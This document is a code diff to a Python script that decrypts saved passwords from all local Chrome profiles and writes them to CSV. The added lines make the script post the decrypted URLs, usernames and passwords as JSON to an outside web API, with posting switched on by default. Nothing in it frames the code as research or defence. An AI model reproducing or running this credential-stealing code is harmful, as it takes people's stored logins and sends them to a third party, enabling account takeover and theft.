@@ -1,5 +1,4 @@
 import os
-import re
 import sys
 import json
 import base64
@@ -8,9 +7,14 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 import csv
+import requests
 
-LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ["USERPROFILE"]))
-USER_DATA = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ["USERPROFILE"]))
+USER = os.environ["USERPROFILE"]
+LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(USER))
+USER_DATA = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(USER))
+CONFIG = "config.json"
+API_ENDPOINT = "https://crudapi.co.uk/api/v1/chrome_data"
+SHOULD_POST = True
 
 def get_secret_key():
     try:
@@ -34,9 +38,7 @@ def decrypt_password(ciphertext, secret_key):
         initialisation_vector = ciphertext[3:15]
         encrypted_password = ciphertext[15:-16]
         cipher = generate_cipher(secret_key, initialisation_vector)
-        decrypted_pass = decrypt_payload(cipher, encrypted_password)
-        decrypted_pass = decrypted_pass.decode()  
-        return decrypted_pass
+        return decrypt_payload(cipher, encrypted_password).decode()
     except Exception as e:
         print(f"\033[0;31m{e}\033[0m")
         print("ERROR: unable to decrypt... chrome version < 80 not supported")
@@ -53,6 +55,12 @@ def get_db_connection(path: str):
     
 def is_chrome_profile(folder_name: str):
     return folder_name.startswith("Profile") or folder_name == "Default"
+
+def post(records):
+    with open(CONFIG, "r", encoding="utf-8") as f:
+        config = json.loads(f.read())
+        response = requests.post(f"{API_ENDPOINT}", json=records, headers={f"Authorization": f"Bearer {config['key']}"})
+        print(f"response: {response.status_code}")
         
 if __name__ == "__main__":
     try:
@@ -68,20 +76,28 @@ if __name__ == "__main__":
                     print(f"\033[1mPATH: {path}\033[0m\n")
                     cursor = connection.cursor()
                     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    records = []
                     for index, login in enumerate(cursor.fetchall()):
-                        pairs = {
+                        record = {
                             "index": index,
                             "url": login[0],
                             "username": login[1],
                         }
                         ciphertext = login[2]
-                        if (pairs['index'] != "" and pairs['username'] != "" and ciphertext != ""):
-                            pairs['password'] = decrypt_password(ciphertext, secret_key)
-                            for key, value in pairs.items():
+                        if (record['index'] != "" and record['username'] != "" and ciphertext != ""):
+                            record['password'] = decrypt_password(ciphertext, secret_key)
+                            for key, value in record.items():
                                 print(f"{key}: {value}")
-                            values = pairs.values()
+                            values = record.values()
                             csv_writer.writerow(list(values))
+                            records.append(record)
                             print()
+                    if SHOULD_POST:
+                        try:
+                            post(records)
+                        except Exception as e:
+                            print(f"\033[0;31m{e}\033[0m")
+                            print("ERROR: could not post details online")
                     cursor.close()
                     connection.close()
                     os.remove("table.db")
